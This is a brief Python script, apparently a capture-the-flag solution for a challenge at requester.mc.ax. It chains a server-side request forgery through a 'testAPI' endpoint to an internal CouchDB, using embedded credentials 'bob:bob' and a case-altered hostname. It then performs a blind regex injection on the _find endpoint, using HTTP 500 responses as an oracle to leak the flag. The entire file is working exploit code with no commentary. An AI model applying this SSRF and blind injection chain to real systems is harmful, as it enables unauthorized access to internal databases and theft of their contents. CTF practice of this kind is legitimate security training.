import requests
import json
import re
from utils.ctf.blind_sqli import blind_sqli
url = "https://requester.mc.ax/testAPI"

#url = "http://localhost/testAPI"

#print(resp.request.url)
#print(resp)
def oracle(inject):
	resp = requests.get(
		url,
		params={
		"url": "http://bob:bob@cOuChDb:5984/bob/_find",
		"method": "POST",
		"data": json.dumps({"selector": {
		"flag": {
		"$regex": "^" + re.escape(inject)
		}
		}})
		}
	)
	return resp.status_code == 500

print(blind_sqli("{}", oracle))